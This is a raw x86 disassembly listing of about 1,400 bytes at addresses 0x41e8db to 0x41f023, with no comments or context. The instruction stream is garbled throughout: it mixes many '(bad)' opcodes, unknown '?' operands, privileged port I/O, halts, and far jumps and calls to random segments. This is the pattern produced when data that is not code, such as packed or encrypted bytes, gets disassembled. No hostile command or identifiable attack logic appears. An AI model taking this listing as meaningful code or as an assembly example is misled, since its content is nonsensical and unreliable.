  41e8db:	retf   
  41e8dc:	and    eax,0x9a5cd252
  41e8e1:	xchg   esp,eax
  41e8e2:	jmp    0x41e8d2
  41e8e4:	push   esp
  41e8e5:	stos   BYTE PTR es:[edi],al
  41e8e6:	fist   WORD PTR [ebp-0x34]
  41e8e9:	je     0x41e923
  41e8eb:	jmp    0x9db6:0xc4a7abe9
  41e8f2:	icebp  
  41e8f3:	or     al,dl
  41e8f5:	add    dl,BYTE PTR [ecx+0x1824cdaf]
  41e8fb:	sahf   
  41e8fc:	fadd   st(4),st
  41e8fe:	iret   
  41e8ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e900:	in     eax,0xa5
  41e902:	stos   DWORD PTR es:[edi],eax
  41e903:	inc    ebp
  41e904:	inc    ebp
  41e905:	add    DWORD PTR [esi],edx
  41e907:	xchg   ecx,eax
  41e908:	and    ecx,DWORD PTR [ecx-0x520e91b8]
  41e90e:	sub    BYTE PTR [edi+0x23103f15],ch
  41e914:	dec    ebp
  41e915:	fld    DWORD PTR [esi]
  41e917:	sbb    DWORD PTR [eax],ebx
  41e919:	scas   al,BYTE PTR es:[edi]
  41e91a:	loope  0x41e8d1
  41e91c:	loope  0x41e95f
  41e91e:	jmp    0xc2c3:0xe786eac6
  41e925:	cmp    al,0xea
  41e927:	push   0x5b524168
  41e92c:	fmul   QWORD PTR [esi+eax*2-0x54]
  41e930:	dec    BYTE PTR [ecx-0x510d8eb]
  41e936:	sbb    bl,BYTE PTR [esi-0x3e715845]
  41e93c:	ja     0x41e9b0
  41e93e:	lea    edi,[edx-0x11]
  41e941:	and    dl,BYTE PTR [edx]
  41e943:	(bad)  
  41e944:	sub    ebp,DWORD PTR [eax+0x277d143d]
  41e94a:	pop    esp
  41e94b:	jo     0x41e927
  41e94d:	aaa    
  41e94e:	sbb    eax,DWORD PTR [edx]
  41e950:	arpl   bp,ax
  41e952:	or     al,0x7f
  41e954:	add    bh,bh
  41e956:	ret    
  41e957:	or     ebx,DWORD PTR [edx+ecx*8+0x9]
  41e95b:	add    bl,BYTE PTR [edi-0x546ef9af]
  41e961:	fmul   st,st(4)
  41e963:	xchg   ebp,eax
  41e964:	ins    DWORD PTR es:[edi],dx
  41e965:	icebp  
  41e966:	popf   
  41e967:	mov    DWORD PTR [edi+0x5b36b9a1],esp
  41e96d:	cs pushf 
  41e96f:	stos   BYTE PTR es:[edi],al
  41e970:	xor    ch,al
  41e972:	xlat   BYTE PTR ds:[ebx]
  41e973:	jne    0x41e9a5
  41e975:	or     BYTE PTR [eax+0x4a5f3d51],0x71
  41e97c:	(bad)  
  41e97d:	call   0x23664f33
  41e982:	adc    BYTE PTR ds:0xb7b361aa,dl
  41e988:	call   0x7609:0x3013cde7
  41e98f:	mov    al,0xd3
  41e991:	stc    
  41e992:	sti    
  41e993:	mov    dl,BYTE PTR ds:0x53599811
  41e999:	jle    0x41e9ed
  41e99b:	sahf   
  41e99c:	mov    ch,BYTE PTR fs:[ebp-0x7e67dd24]
  41e9a3:	pop    edx
  41e9a4:	test   cl,ah
  41e9a6:	mov    eax,0x7b4ce0ec
  41e9ab:	out    dx,al
  41e9ac:	mov    ch,0xad
  41e9ae:	dec    ebp
  41e9af:	xchg   esp,eax
  41e9b0:	pop    ds
  41e9b1:	fidivr DWORD PTR [ebx+0x277de53f]
  41e9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b8:	out    dx,eax
  41e9b9:	cld    
  41e9ba:	dec    edi
  41e9bb:	xchg   ebp,eax
  41e9bc:	in     al,dx
  41e9bd:	int    0x7
  41e9bf:	adc    dl,BYTE PTR [ebp-0x4a]
  41e9c2:	pop    edi
  41e9c3:	mov    esi,0xa26188af
  41e9c8:	(bad)  
  41e9ca:	repnz fstp TBYTE PTR [esi]
  41e9cd:	push   edx
  41e9ce:	lahf   
  41e9cf:	push   0xffffff99
  41e9d1:	jmp    0x41ea40
  41e9d3:	out    dx,eax
  41e9d4:	imul   esi,eax,0x7f7856af
  41e9da:	mov    ds:0xb5424b42,al
  41e9df:	or     al,al
  41e9e1:	fwait
  41e9e2:	jne    0x41e9e9
  41e9e4:	das    
  41e9e5:	fnstcw WORD PTR [eax+0x39]
  41e9e8:	shl    bl,cl
  41e9ea:	jne    0x41e9b5
  41e9ec:	push   ebx
  41e9ed:	mov    ?,WORD PTR [edx+0x150f46f7]
  41e9f3:	mov    esp,0x3c6b5318
  41e9f8:	cmp    esi,DWORD PTR [edx+0x72]
  41e9fb:	stos   BYTE PTR es:[edi],al
  41e9fc:	loope  0x41ea1d
  41e9fe:	clc    
  41e9ff:	xor    esp,eax
  41ea01:	push   ebx
  41ea02:	ja     0x41ea33
  41ea04:	dec    edi
  41ea05:	adc    al,BYTE PTR [esi+ebp*8-0x1b]
  41ea09:	dec    ebp
  41ea0a:	(bad)  
  41ea0b:	cwde   
  41ea0c:	inc    ebp
  41ea0d:	dec    ecx
  41ea0e:	shr    DWORD PTR [esi+0x755b0028],1
  41ea14:	iret   
  41ea15:	xor    ebp,edi
  41ea17:	(bad)  
  41ea18:	lock hlt 
  41ea1a:	rcl    BYTE PTR [ebx-0x51f208e8],1
  41ea20:	fistp  DWORD PTR [ebp-0x32e1c17c]
  41ea26:	pop    ebp
  41ea27:	fld    DWORD PTR [edi-0x38766411]
  41ea2d:	shr    DWORD PTR [ebx-0x65],cl
  41ea30:	xor    BYTE PTR es:[ebx],0xac
  41ea34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea35:	fidiv  WORD PTR [edx]
  41ea37:	cmp    eax,0x72a054dc
  41ea3c:	cdq    
  41ea3d:	mov    dl,0xea
  41ea3f:	jmp    0x3ec6:0x65d6b8f1
  41ea46:	dec    ecx
  41ea47:	push   0xb2f52425
  41ea4c:	xchg   esi,eax
  41ea4d:	dec    esp
  41ea4e:	popa   
  41ea4f:	add    ah,BYTE PTR ds:0xa7cefc00
  41ea55:	xchg   esp,eax
  41ea56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea57:	out    dx,eax
  41ea58:	popa   
  41ea59:	loop   0x41eacd
  41ea5b:	(bad)  
  41ea5c:	jmp    0xfd2a158d
  41ea61:	add    al,0xfe
  41ea63:	xor    ch,BYTE PTR fs:[eax]
  41ea66:	cmp    dl,cl
  41ea68:	pop    ebp
  41ea69:	sub    dl,BYTE PTR [esi+0xa]
  41ea6c:	dec    ebx
  41ea6d:	inc    esi
  41ea6e:	scas   al,BYTE PTR es:[edi]
  41ea6f:	sub    al,0xf5
  41ea71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea72:	nop
  41ea73:	push   ecx
  41ea74:	and    edi,eax
  41ea76:	xor    BYTE PTR [edi],bh
  41ea78:	mov    BYTE PTR [ebx+ebp*8+0xc],0x1b
  41ea7d:	adc    eax,0x8b134b9
  41ea82:	push   edi
  41ea83:	ret    0xd14d
  41ea86:	sbb    edx,edx
  41ea88:	int    0x8a
  41ea8a:	jne    0x41ea41
  41ea8c:	mov    esi,0x8d77ae90
  41ea91:	shr    BYTE PTR [edx+0x2be0fd6b],cl
  41ea97:	ds mov ebx,0xfc2af88a
  41ea9d:	gs out 0x70,eax
  41eaa0:	in     eax,dx
  41eaa1:	cmp    esi,DWORD PTR [ebx-0x1d]
  41eaa4:	adc    eax,0xe138d5bc
  41eaa9:	fdiv   QWORD PTR [ecx+0x41034de5]
  41eaaf:	mov    eax,ds:0x68d6499a
  41eab4:	scas   al,BYTE PTR es:[edi]
  41eab5:	int    0x4a
  41eab7:	loop   0x41ea7c
  41eab9:	(bad)  
  41eaba:	fimul  WORD PTR [esi-0x53f1f5f]
  41eac0:	mov    edx,ss
  41eac2:	test   DWORD PTR [edx],esi
  41eac4:	(bad)  
  41eac5:	adc    ebp,esi
  41eac7:	or     DWORD PTR [esi+0x274eb9df],esp
  41eacd:	xchg   edi,eax
  41eace:	xchg   BYTE PTR [eax],bl
  41ead0:	push   cs
  41ead1:	daa    
  41ead2:	fs pop ds
  41ead4:	(bad)  
  41ead5:	pop    ebp
  41ead6:	inc    edx
  41ead7:	mov    ch,0x43
  41ead9:	lods   al,BYTE PTR ds:[esi]
  41eada:	push   cs
  41eadb:	ret    
  41eadc:	push   ebp
  41eadd:	sar    BYTE PTR [eax+0x5],0x7f
  41eae1:	jge    0x41eaa1
  41eae3:	cmp    eax,0x6a61c7d1
  41eae8:	test   al,0xf8
  41eaea:	add    eax,0x8460dd6f
  41eaef:	imul   edx,DWORD PTR [edx-0xafe3463],0xffffffa1
  41eaf6:	sub    edi,ebp
  41eaf8:	mov    ebx,0x823918ad
  41eafd:	jne    0x41eb3a
  41eaff:	xchg   DWORD PTR ss:[ecx+0x71],edx
  41eb03:	mov    ds:0xc9f059e7,eax
  41eb08:	or     edx,ebx
  41eb0a:	or     ah,BYTE PTR [ebp+0x3c635235]
  41eb10:	sar    DWORD PTR ds:[edx-0x3b92493e],0x1e
  41eb18:	xchg   esp,eax
  41eb19:	pop    ebp
  41eb1a:	mov    cl,0x64
  41eb1c:	jl     0x41eb5d
  41eb1e:	add    ebx,ebp
  41eb20:	stos   BYTE PTR es:[edi],al
  41eb21:	fbstp  TBYTE PTR [esi-0x4d37995e]
  41eb27:	sti    
  41eb28:	xchg   edi,eax
  41eb29:	mov    edx,0x3b944cfc
  41eb2e:	fs or  ebx,esp
  41eb31:	ja     0x41eabb
  41eb33:	inc    esi
  41eb34:	adc    BYTE PTR [edx+0x14027753],ch
  41eb3a:	std    
  41eb3b:	mov    bl,0x14
  41eb3d:	ins    BYTE PTR es:[edi],dx
  41eb3e:	mov    al,ds:0xea9af304
  41eb43:	mov    eax,0x17c959ec
  41eb48:	add    ebp,ecx
  41eb4a:	or     DWORD PTR [edi+0x1a],esi
  41eb4d:	xor    esi,ebx
  41eb4f:	adc    eax,0x61eebf94
  41eb54:	sub    al,0xa6
  41eb56:	lods   al,BYTE PTR ds:[esi]
  41eb57:	lds    ebp,FWORD PTR [ebp-0x578ffe2b]
  41eb5d:	push   cs
  41eb5e:	(bad)  
  41eb5f:	(bad)  
  41eb61:	cmp    DWORD PTR [esi],ebp
  41eb63:	jge    0x41eba0
  41eb65:	ret    
  41eb66:	fsub   DWORD PTR [edi-0x7ff877d0]
  41eb6c:	adc    BYTE PTR [eax-0x2c5f24d3],0x52
  41eb73:	xchg   edx,eax
  41eb74:	jg     0x41eb69
  41eb76:	push   esi
  41eb77:	out    0xcd,al
  41eb79:	mov    ds,WORD PTR [ecx+0x45226acc]
  41eb7f:	call   0xe98f:0x4c32cc5c
  41eb86:	mov    bl,0x9c
  41eb88:	mov    ah,0xa9
  41eb8a:	mov    ds:0x41f957f6,eax
  41eb8f:	pop    edx
  41eb90:	loop   0x41ebcf
  41eb92:	adc    BYTE PTR [edi+0x37],ch
  41eb95:	add    dl,BYTE PTR [edx]
  41eb97:	mov    dh,0xcb
  41eb99:	pop    ss
  41eb9a:	xchg   DWORD PTR [ecx-0x15861e69],eax
  41eba0:	aam    0xa3
  41eba2:	fs or  al,0x8c
  41eba5:	loope  0x41eb3c
  41eba7:	sub    edx,0x93840641
  41ebad:	inc    esi
  41ebae:	dec    ebx
  41ebaf:	icebp  
  41ebb0:	cmp    ecx,eax
  41ebb2:	dec    ecx
  41ebb3:	bnd js 0x41eb72
  41ebb6:	lea    ebp,ds:0xa5678692
  41ebbc:	arpl   WORD PTR [edi+edx*1+0x15],cx
  41ebc0:	mov    edi,0xf68f28cb
  41ebc5:	iret   
  41ebc6:	fstp   QWORD PTR [edx+0x5a]
  41ebc9:	fucomip st,st(7)
  41ebcb:	lods   al,BYTE PTR ds:[esi]
  41ebcc:	std    
  41ebcd:	xlat   BYTE PTR ds:[ebx]
  41ebce:	rcr    edi,1
  41ebd0:	push   0xa55edb4d
  41ebd5:	xor    al,BYTE PTR [ebp+0x73a4d45c]
  41ebdb:	js     0x41ebd3
  41ebdd:	lods   al,BYTE PTR ds:[esi]
  41ebde:	jo     0x41ec01
  41ebe0:	mov    dl,0xfb
  41ebe2:	mov    bh,0xd0
  41ebe4:	push   ecx
  41ebe5:	inc    ebx
  41ebe6:	fidivr WORD PTR [edi+0x6b]
  41ebe9:	push   ebp
  41ebea:	xchg   esi,eax
  41ebeb:	ficomp WORD PTR [ebx+edx*4-0xfa4374f]
  41ebf2:	out    dx,eax
  41ebf3:	lock push ds
  41ebf5:	faddp  st(6),st
  41ebf7:	outs   dx,DWORD PTR ds:[esi]
  41ebf8:	bound  esi,QWORD PTR [eax]
  41ebfa:	sahf   
  41ebfb:	mov    bl,0x2e
  41ebfd:	shl    BYTE PTR [ecx+ebx*8],cl
  41ec00:	jns    0x41eba6
  41ec02:	popf   
  41ec03:	or     DWORD PTR [esi+0x477dca6c],ebp
  41ec09:	sub    dh,BYTE PTR [ecx]
  41ec0b:	push   0xffffff8b
  41ec0d:	mov    esp,0x762baf03
  41ec12:	jle    0x41ec4c
  41ec14:	js     0x41ec0f
  41ec16:	clc    
  41ec17:	adc    DWORD PTR [edi-0x68],ebx
  41ec1a:	mov    bh,0x80
  41ec1c:	mov    esp,0xaaf3d8c6
  41ec21:	add    esi,ebp
  41ec23:	and    BYTE PTR [eax+0x743315d7],ch
  41ec29:	xchg   DWORD PTR [edx-0x1007c4bd],edx
  41ec2f:	loop   0x41ec3a
  41ec31:	cmc    
  41ec32:	inc    ebx
  41ec33:	sbb    edx,edi
  41ec35:	cld    
  41ec36:	retf   
  41ec37:	aam    0x73
  41ec39:	loop   0x41ec25
  41ec3b:	push   eax
  41ec3c:	shl    BYTE PTR [ebx],cl
  41ec3e:	std    
  41ec3f:	cmp    ebx,edi
  41ec41:	cmp    BYTE PTR [ecx-0x18def8a5],dl
  41ec47:	out    dx,eax
  41ec48:	sbb    DWORD PTR [ebp-0x711f868f],0x64
  41ec4f:	cli    
  41ec50:	inc    eax
  41ec51:	repnz xchg esi,eax
  41ec53:	dec    edx
  41ec54:	sub    eax,0xaac68924
  41ec59:	and    al,0xca
  41ec5b:	jge    0x41ec75
  41ec5d:	add    bh,dl
  41ec5f:	inc    edi
  41ec60:	inc    edi
  41ec61:	xor    BYTE PTR [eax+0x6e],dh
  41ec64:	aam    0x84
  41ec66:	pop    ss
  41ec67:	lea    eax,[edx+0x64]
  41ec6a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ec6c:	mov    ecx,DWORD PTR [edi]
  41ec6e:	fsubr  DWORD PTR [esi-0x64979e0d]
  41ec74:	mov    ?,WORD PTR [eax-0x6d2cd40f]
  41ec7a:	pushf  
  41ec7b:	pop    eax
  41ec7c:	xor    ch,BYTE PTR [esi-0x9e3c4f]
  41ec82:	mov    ah,0x47
  41ec84:	adc    eax,0xf4d86eb7
  41ec89:	stos   DWORD PTR es:[edi],eax
  41ec8a:	daa    
  41ec8b:	sar    eax,cl
  41ec8d:	cmp    ah,BYTE PTR [eax]
  41ec8f:	pop    esp
  41ec90:	repz sbb BYTE PTR [edx],0x6b
  41ec94:	add    ecx,DWORD PTR [ebp+0x8]
  41ec97:	vcvtsd2ss xmm7,xmm4,QWORD PTR [esi+0x2a]
  41ec9c:	and    eax,0x953f6268
  41eca1:	mov    eax,0xac6cb2d9
  41eca6:	stos   BYTE PTR es:[edi],al
  41eca7:	(bad)  
  41eca8:	adc    DWORD PTR [esi+0x7e],ebp
  41ecab:	outs   dx,DWORD PTR ds:[esi]
  41ecac:	aaa    
  41ecad:	mov    ds:0x8ba5c952,eax
  41ecb2:	scas   al,BYTE PTR es:[edi]
  41ecb3:	cli    
  41ecb4:	cmp    eax,0xea0e4a0b
  41ecb9:	mov    ch,0x46
  41ecbb:	sti    
  41ecbc:	push   0x46
  41ecbe:	fs mov ah,0xa9
  41ecc1:	sbb    BYTE PTR [ebp-0xa],dh
  41ecc4:	lock pop esp
  41ecc6:	xchg   ecx,eax
  41ecc7:	cmp    BYTE PTR [eax+0x6aca0c00],bh
  41eccd:	xchg   esp,eax
  41ecce:	or     BYTE PTR [ecx+0x5ad4b0ec],dl
  41ecd4:	xor    ebx,DWORD PTR [eax+0x7ff9350a]
  41ecda:	mov    BYTE PTR [ebp-0x4e729c0a],al
  41ece0:	pusha  
  41ece1:	lahf   
  41ece2:	push   cs
  41ece3:	push   0xb607142
  41ece8:	stos   BYTE PTR es:[edi],al
  41ece9:	adc    eax,0x6132f1a4
  41ecee:	aam    0x85
  41ecf0:	mul    dh
  41ecf2:	test   al,0x8c
  41ecf4:	sub    eax,0x3e3e9bf2
  41ecf9:	(bad)  
  41ecfa:	ss in  eax,dx
  41ecfc:	vmptrld QWORD PTR [ebp+0x50]
  41ed00:	(bad)  [edx-0x1f96ebfc]
  41ed06:	out    dx,al
  41ed07:	aaa    
  41ed08:	fwait
  41ed09:	pop    esp
  41ed0a:	jb     0x41ed01
  41ed0c:	and    DWORD PTR [ecx],edi
  41ed0e:	int    0x35
  41ed10:	inc    ebp
  41ed11:	and    DWORD PTR [edi],ecx
  41ed13:	sub    ah,dl
  41ed15:	mov    eax,ds:0xa32b59d5
  41ed1a:	in     eax,0xea
  41ed1c:	xor    cl,BYTE PTR [ecx]
  41ed1e:	pop    eax
  41ed1f:	(bad)
  41ed22:	stos   BYTE PTR es:[edi],al
  41ed23:	mov    ecx,0xb2ba629
  41ed28:	or     eax,0xb935899b
  41ed2d:	adc    dl,BYTE PTR [esi]
  41ed2f:	cmp    edi,edi
  41ed31:	xor    dl,BYTE PTR [eax-0x5d]
  41ed34:	rcr    BYTE PTR [edx],1
  41ed36:	hlt    
  41ed37:	pop    edx
  41ed38:	and    cl,BYTE PTR [ebx]
  41ed3a:	pop    ss
  41ed3b:	fwait
  41ed3c:	push   esp
  41ed3d:	push   ss
  41ed3e:	push   ecx
  41ed3f:	call   0xebd8dd43
  41ed44:	jp     0x41ecfa
  41ed46:	add    ecx,DWORD PTR [ecx]
  41ed48:	xor    ecx,0x35971f15
  41ed4e:	sahf   
  41ed4f:	pop    ss
  41ed50:	xor    eax,eax
  41ed52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed53:	les    esp,FWORD PTR [edx]
  41ed55:	mov    ah,0x56
  41ed57:	shr    DWORD PTR [ebx],0xf5
  41ed5a:	mov    ecx,0x805e3df7
  41ed5f:	imul   DWORD PTR [ebx+0x7be7ab0b]
  41ed65:	fisttp WORD PTR [edx+edx*8+0x78ee5b5]
  41ed6c:	adc    edx,DWORD PTR [edx]
  41ed6e:	and    DWORD PTR [edi-0x331b583a],esp
  41ed74:	pusha  
  41ed75:	cmp    DWORD PTR [ebp-0x5da55292],edx
  41ed7b:	mov    ecx,0x7eaeb5dc
  41ed80:	in     al,0x2d
  41ed82:	data16 (bad) 
  41ed84:	das    
  41ed85:	add    al,0x1a
  41ed87:	pop    ebx
  41ed88:	and    bh,cl
  41ed8a:	out    0xed,eax
  41ed8c:	pop    edi
  41ed8d:	mov    ebp,0xb1fd5b17
  41ed92:	ja     0x41ede3
  41ed94:	stos   BYTE PTR es:[edi],al
  41ed95:	adc    eax,0x7e08703c
  41ed9a:	add    al,0x99
  41ed9c:	(bad)  
  41ed9d:	ficom  WORD PTR [ebp-0x36294743]
  41eda3:	popa   
  41eda4:	pop    edi
  41eda5:	stc    
  41eda6:	xchg   esp,eax
  41eda7:	adc    DWORD PTR [edi+ebp*8-0x783e40f6],0x66
  41edaf:	fwait
  41edb0:	sub    al,0xb8
  41edb2:	call   0x5920:0x5e6f1b98
  41edb9:	cmp    DWORD PTR [esi-0x7],eax
  41edbc:	cmc    
  41edbd:	cli    
  41edbe:	xor    BYTE PTR [esi+edi*4],bl
  41edc1:	dec    edi
  41edc2:	ret    0xbf0
  41edc5:	cmp    DWORD PTR [edx-0x52],eax
  41edc8:	ins    DWORD PTR es:[edi],dx
  41edc9:	mov    WORD PTR [ecx+0x6d3873b9],?
  41edcf:	dec    esp
  41edd0:	cli    
  41edd1:	push   ebx
  41edd2:	jo     0x41edc0
  41edd4:	loopne 0x41ee35
  41edd6:	dec    BYTE PTR [esi+eax*1]
  41edd9:	push   ds
  41edda:	push   ebp
  41eddb:	sub    BYTE PTR [edi],cl
  41eddd:	ss add eax,0x336ba464
  41ede3:	ds push esp
  41ede5:	shl    BYTE PTR [edx],0x6b
  41ede8:	inc    esp
  41ede9:	sbb    DWORD PTR [eax-0x8],edx
  41edec:	cmp    eax,0x49aa9c45
  41edf1:	adc    BYTE PTR [edi+0x67],0x67
  41edf5:	dec    edi
  41edf6:	sub    BYTE PTR [ecx+0x7c],ch
  41edf9:	dec    ecx
  41edfa:	mov    eax,0x47c5b4a4
  41edff:	mov    ds:0x5c17569a,al
  41ee04:	je     0x41ed90
  41ee06:	sahf   
  41ee07:	repz fistp DWORD PTR [edx+edi*2-0x2f2718c9]
  41ee0f:	mov    cl,0x88
  41ee11:	pop    ss
  41ee12:	push   es
  41ee13:	dec    ebx
  41ee14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee16:	test   al,0x25
  41ee18:	add    dl,BYTE PTR [esi-0x40]
  41ee1b:	cmp    eax,0xc3e6ba85
  41ee20:	mov    edi,0xe6c3825c
  41ee25:	dec    ecx
  41ee26:	icebp  
  41ee27:	addr16 mov bh,0x98
  41ee2a:	mov    dh,0xba
  41ee2c:	inc    edi
  41ee2d:	jmp    0xe1054b3
  41ee32:	push   edx
  41ee33:	xlat   BYTE PTR ds:[ebx]
  41ee34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee35:	xchg   ebp,esp
  41ee37:	push   esi
  41ee38:	stc    
  41ee39:	(bad)  
  41ee3a:	mov    BYTE PTR ds:0xbcbe1ca4,ah
  41ee40:	popa   
  41ee41:	inc    esi
  41ee42:	cmp    DWORD PTR [esi+0x36],0xdea3d7f
  41ee49:	pushf  
  41ee4a:	shl    DWORD PTR [edx+0x60],0x50
  41ee4e:	cmc    
  41ee4f:	adc    DWORD PTR [edi+0x318b9ff4],ecx
  41ee55:	jo     0x41eeb1
  41ee57:	cld    
  41ee58:	sbb    DWORD PTR [esp+ecx*2-0x64],esp
  41ee5c:	out    0x9f,al
  41ee5e:	fnstsw WORD PTR [edx]
  41ee60:	or     edi,DWORD PTR [ebp-0x62]
  41ee63:	sub    eax,0xc4458c3a
  41ee68:	xchg   esi,eax
  41ee69:	outs   dx,BYTE PTR ds:[esi]
  41ee6a:	pop    ebx
  41ee6b:	(bad)  
  41ee6c:	mov    esi,0x6ea0fe56
  41ee71:	jge    0x41eea2
  41ee73:	out    0x8c,eax
  41ee75:	mov    gs,WORD PTR [edi+eax*8]
  41ee78:	add    al,BYTE PTR [edi-0x36d87631]
  41ee7e:	mov    al,ds:0x7bba4ff6
  41ee83:	or     al,0xf3
  41ee85:	mov    dl,0x11
  41ee87:	(bad)  
  41ee88:	clc    
  41ee89:	sbb    eax,0x8634fd21
  41ee8e:	mul    DWORD PTR [ebx+0x1b]
  41ee91:	shl    ah,0x94
  41ee94:	nop
  41ee95:	pop    edi
  41ee96:	pop    ebx
  41ee97:	imul   eax,DWORD PTR [edx-0x5602e673],0xffffff8e
  41ee9e:	(bad)  
  41ee9f:	jl     0x41ee9d
  41eea1:	jmp    0x41ee85
  41eea3:	lds    ebp,FWORD PTR [edi-0x46]
  41eea6:	idiv   BYTE PTR [eax]
  41eea8:	xchg   ecx,eax
  41eea9:	(bad)  
  41eeaa:	aas    
  41eeab:	add    DWORD PTR gs:[esp+eiz*2],0xffffffc7
  41eeb0:	push   esp
  41eeb1:	push   ebx
  41eeb2:	(bad)  
  41eeb3:	sbb    bh,ah
  41eeb5:	dec    esp
  41eeb6:	push   ss
  41eeb7:	iret   
  41eeb8:	jge    0x41ef13
  41eeba:	mov    bl,0xa8
  41eebc:	scas   eax,DWORD PTR es:[edi]
  41eebd:	mov    bl,0xb
  41eebf:	push   ss
  41eec0:	sbb    bl,BYTE PTR [eax+0x586831cc]
  41eec6:	fdivr  st(3),st
  41eec8:	pop    ds
  41eec9:	sahf   
  41eeca:	ret    
  41eecb:	push   eax
  41eecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eecd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eecf:	add    al,ah
  41eed1:	pop    DWORD PTR [edx+eax*1-0x42]
  41eed5:	jp     0x41ef3d
  41eed7:	pop    es
  41eed8:	mov    ebp,0xb1fbd439
  41eedd:	data16 ins BYTE PTR es:[edi],dx
  41eedf:	mov    ebp,0x2b22b1ac
  41eee4:	(bad)
  41eee7:	icebp  
  41eee8:	jmp    0xc24ebabf
  41eeed:	pop    ebx
  41eeee:	mov    dl,BYTE PTR [esi-0x75]
  41eef1:	sahf   
  41eef2:	xchg   ecx,eax
  41eef3:	mov    eax,ds:0x2e951ca2
  41eef8:	sbb    BYTE PTR [ebx+0x1024e26b],dl
  41eefe:	mov    ch,0x16
  41ef00:	sub    bh,ah
  41ef02:	fnstsw WORD PTR [eax-0x38]
  41ef05:	(bad)  [ebx+esi*1-0x289a88d4]
  41ef0c:	in     eax,0xe0
  41ef0e:	and    BYTE PTR [eax],0xaf
  41ef11:	and    BYTE PTR ds:0x19fca93d,0x38
  41ef18:	aaa    
  41ef19:	push   esp
  41ef1a:	arpl   WORD PTR [ebp+0x29],sp
  41ef1d:	mov    ds:0xe6c935f5,eax
  41ef22:	push   esp
  41ef23:	fstp   DWORD PTR [edi+0x6f977e46]
  41ef29:	push   ds
  41ef2a:	sbb    al,0x70
  41ef2c:	sub    dl,cl
  41ef2e:	and    dh,BYTE PTR [ebx]
  41ef30:	leave  
  41ef31:	sahf   
  41ef32:	lds    ebx,FWORD PTR [esi+ecx*2-0x44]
  41ef36:	push   ecx
  41ef37:	jo     0x41efb6
  41ef39:	or     edx,0x2e
  41ef3c:	jo     0x41ef30
  41ef3e:	ror    eax,cl
  41ef40:	xchg   edi,eax
  41ef41:	xchg   esp,eax
  41ef42:	mov    edx,0xeaeb064d
  41ef47:	lds    ebp,FWORD PTR [ebx]
  41ef49:	cli    
  41ef4a:	ror    bh,cl
  41ef4c:	add    al,0x35
  41ef4e:	in     al,0x22
  41ef50:	pop    esi
  41ef51:	add    edi,0x70
  41ef54:	loopne 0x41ef28
  41ef56:	shr    BYTE PTR [esi-0x5e],0xde
  41ef5a:	popa   
  41ef5b:	call   0x42197d88
  41ef60:	scas   eax,DWORD PTR es:[edi]
  41ef61:	sub    ch,dl
  41ef63:	mov    DWORD PTR [edi-0x32cf2389],ebp
  41ef69:	outs   dx,BYTE PTR ds:[esi]
  41ef6a:	pop    esp
  41ef6b:	push   0x4d327ecd
  41ef70:	fldenv [edi]
  41ef72:	scas   eax,DWORD PTR es:[edi]
  41ef73:	xchg   ebx,eax
  41ef74:	pop    edx
  41ef75:	xor    DWORD PTR [edi-0x1774529d],ebx
  41ef7b:	sbb    al,0xca
  41ef7d:	jge    0x41eff1
  41ef7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef80:	dec    esp
  41ef81:	sub    DWORD PTR [ecx-0x78],esp
  41ef84:	test   al,0xdf
  41ef86:	rcl    DWORD PTR [ecx+0x63e1eea6],1
  41ef8c:	test   eax,0x1cc3c8bf
  41ef91:	ret    
  41ef92:	imul   ecx,DWORD PTR [esi+0x30accebc],0x3d310721
  41ef9c:	cmc    
  41ef9d:	lods   eax,DWORD PTR ds:[esi]
  41ef9e:	push   ds
  41ef9f:	aaa    
  41efa0:	cmp    BYTE PTR [edx-0x3df2f49d],al
  41efa6:	cmp    BYTE PTR [ebp+0x11],0x8a
  41efaa:	mov    cl,0x4e
  41efac:	or     bh,BYTE PTR [eax+0x13581992]
  41efb2:	or     al,0xfc
  41efb4:	mov    bh,0x45
  41efb6:	pop    edx
  41efb7:	rol    ebp,cl
  41efb9:	and    al,0xe1
  41efbb:	cdq    
  41efbc:	ja     0x41efa5
  41efbe:	cld    
  41efbf:	leave  
  41efc0:	dec    ebx
  41efc1:	push   ebx
  41efc2:	scas   al,BYTE PTR es:[edi]
  41efc3:	inc    ebx
  41efc4:	rcl    DWORD PTR [eax+0xf472ebb],1
  41efca:	dec    ebx
  41efcb:	xor    DWORD PTR [ebp-0x7c],esi
  41efce:	ret    0x9cee
  41efd1:	loopne 0x41efac
  41efd3:	pop    edi
  41efd4:	xchg   edx,eax
  41efd5:	sbb    al,ah
  41efd7:	push   ss
  41efd8:	mov    ebp,0xbb18b8b3
  41efdd:	popf   
  41efde:	lods   eax,DWORD PTR ds:[esi]
  41efdf:	jmp    FWORD PTR [edi+0x6d]
  41efe2:	adc    esi,esp
  41efe4:	jo     0x41f042
  41efe6:	pushf  
  41efe7:	fnstsw WORD PTR [ebp+0x2b]
  41efea:	xor    DWORD PTR [ebx],esi
  41efec:	daa    
  41efed:	loope  0x41f05e
  41efef:	sub    esp,DWORD PTR [eax+esi*4+0x642d4309]
  41eff6:	loopne 0x41ef82
  41eff8:	mov    bl,0x15
  41effa:	les    ebp,FWORD PTR [ebx+eiz*1]
  41effd:	bound  edi,QWORD PTR [eax-0x2c4ce235]
  41f003:	enter  0xce01,0xf8
  41f007:	pop    ss
  41f008:	enter  0xe092,0xa7
  41f00c:	fstp   TBYTE PTR [edi]
  41f00e:	sbb    eax,0x4de9e66a
  41f013:	inc    esp
  41f014:	sub    ebp,DWORD PTR [edx+0x60]
  41f017:	add    BYTE PTR [esi],al
  41f019:	push   esi
  41f01a:	xchg   BYTE PTR [eax],ah
  41f01c:	mov    bh,0x22
  41f01e:	mov    bl,ah
  41f020:	ins    BYTE PTR es:[edi],dx
  41f021:	fisttp QWORD PTR [ebx]
  41f023:	in     al,0x29
